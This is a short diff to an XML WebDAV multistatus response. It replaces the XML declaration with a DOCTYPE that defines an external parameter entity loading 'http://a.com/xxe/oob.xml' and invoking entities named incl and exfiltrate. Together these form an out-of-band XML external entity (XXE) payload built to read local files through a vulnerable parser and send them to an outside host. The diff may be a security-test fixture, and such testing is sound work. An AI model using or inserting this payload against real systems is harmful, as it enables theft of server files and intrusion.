@@ -1,4 +1,9 @@
-<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE propfind [
+<!ENTITY % remote SYSTEM "http://a.com/xxe/oob.xml">
+%remote;
+%incl;
+%exfiltrate;
+]>
 <D:multistatus xmlns:D="DAV:">
   <D:response>
     <D:href>http://dav.messagingengine.com/</D:href>
